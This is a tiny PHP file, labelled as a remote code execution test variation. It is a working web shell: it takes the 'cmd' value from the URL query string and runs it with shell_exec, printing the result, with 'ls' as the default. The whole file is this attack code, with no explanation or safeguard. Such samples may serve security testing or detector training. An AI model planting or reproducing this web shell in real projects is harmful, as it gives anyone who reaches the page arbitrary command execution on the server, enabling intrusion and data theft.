<?php
// RCE test variation #1278
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>